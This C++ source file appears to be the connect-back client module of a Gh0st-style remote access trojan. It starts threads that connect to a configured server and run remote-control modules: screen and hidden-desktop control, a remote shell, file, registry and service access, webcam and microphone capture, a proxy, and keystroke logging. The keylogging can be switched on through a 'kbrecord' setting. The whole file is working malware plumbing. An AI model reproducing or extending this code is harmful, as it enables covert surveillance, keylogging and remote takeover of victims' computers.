#include "StdAfx.h"
#include "Common.h"

#include "ScreenManager.h"
#include "FileManager.h"
#include "TalkManager.h"
#include "ShellManager.h"
#include "SystemManager.h"
#include "ConPTYManager.h"
#include "AudioManager.h"
#include "RegisterManager.h"
#include "ServicesManager.h"
#include "VideoManager.h"
#include "KeyboardManager.h"
#include "ProxyManager.h"

#include "KernelManager.h"
#include <iniFile.h>


DWORD WINAPI ThreadProc(LPVOID lParam)
{
    THREAD_ARG_LIST	ThreadArgList = {0};
    memcpy(&ThreadArgList,lParam,sizeof(THREAD_ARG_LIST));
    SetEvent(ThreadArgList.hEvent);

    DWORD dwReturn = ThreadArgList.StartAddress(ThreadArgList.lParam);
    return dwReturn;
}

template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
{
    ThreadInfo *pInfo = (ThreadInfo *)lParam;
    IOCPClient	*ClientObject = (IOCPClient *)pInfo->p;
    CONNECT_ADDRESS& g_SETTINGS(*(pInfo->conn));
    ClientObject->SetServerAddress(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
    if (pInfo->run == FOREVER_RUN || ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort())) {
        Manager	m(ClientObject, n, pInfo->user);
        pInfo->user = &m;
        ClientObject->RunEventLoop(pInfo->run);
        pInfo->user = NULL;
    }
    delete ClientObject;
    pInfo->p = NULL;

    return 0;
}

#ifdef _WIN64
#ifdef _DEBUG
#pragma comment(lib, "PrivateDesktop_Libx64d.lib")
#else
#pragma comment(lib, "PrivateDesktop_Libx64.lib")
#endif
#else
#ifdef _DEBUG
#pragma comment(lib, "PrivateDesktop_Libd.lib")
#else
#pragma comment(lib, "PrivateDesktop_Lib.lib")
#endif
#endif

DWORD private_desktop(CONNECT_ADDRESS* conn, const State &exit, const std::string& hash, const std::string& hmac)
{
    void ShowBlackWindow(IOCPBase * ClientObject, CONNECT_ADDRESS * conn, const std::string & hash, const std::string & hmac);
    IOCPClient* ClientObject = new IOCPClient(exit, true, MaskTypeNone, conn);
    if (ClientObject->ConnectServer(conn->ServerIP(), conn->ServerPort())) {
        CScreenManager	m(ClientObject, 32, (void*)1);
        if (IsWindows8orHigher()) {
            ShowBlackWindow(ClientObject, conn, hash, hmac);
        } else {
            ClientObject->RunEventLoop(TRUE);
        }
    }
    delete ClientObject;

    return 0;
}

DWORD WINAPI LoopScreenManager(LPVOID lParam)
{
    return LoopManager<CScreenManager, 0>(lParam);
}

DWORD WINAPI LoopFileManager(LPVOID lParam)
{
    return LoopManager<CFileManager, 0>(lParam);
}

DWORD WINAPI LoopTalkManager(LPVOID lParam)
{
    return LoopManager<CTalkManager, 0>(lParam);
}

DWORD WINAPI LoopShellManager(LPVOID lParam)
{
    // Use ConPTY for xterm.js terminal on Windows 10 1809+, fallback to legacy pipe
    if (CConPTYManager::IsConPTYSupported()) {
        return LoopManager<CConPTYManager, 0>(lParam);
    }
    return LoopManager<CShellManager, 0>(lParam);
}

DWORD WINAPI LoopProcessManager(LPVOID lParam)
{
    return LoopManager<CSystemManager, COMMAND_SYSTEM>(lParam);
}

DWORD WINAPI LoopWindowManager(LPVOID lParam)
{
    return LoopManager<CSystemManager, COMMAND_WSLIST>(lParam);
}

DWORD WINAPI LoopVideoManager(LPVOID lParam)
{
    return LoopManager<CVideoManager, 0>(lParam);
}

DWORD WINAPI LoopAudioManager(LPVOID lParam)
{
    return LoopManager<CAudioManager, 0>(lParam);
}

DWORD WINAPI LoopRegisterManager(LPVOID lParam)
{
    return LoopManager<CRegisterManager, 0>(lParam);
}

DWORD WINAPI LoopServicesManager(LPVOID lParam)
{
    return LoopManager<CServicesManager, 0>(lParam);
}

DWORD WINAPI LoopKeyboardManager(LPVOID lParam)
{
    iniFile cfg(CLIENT_PATH);
    std::string s = cfg.GetStr("settings", "kbrecord", "No");
    if (s == "Yes") {
        return LoopManager<CKeyboardManager1, 1>(lParam);
    }
    return LoopManager<CKeyboardManager1, 0>(lParam);
}

DWORD WINAPI LoopProxyManager(LPVOID lParam)
{
    return LoopManager<CProxyManager, 0>(lParam);
}
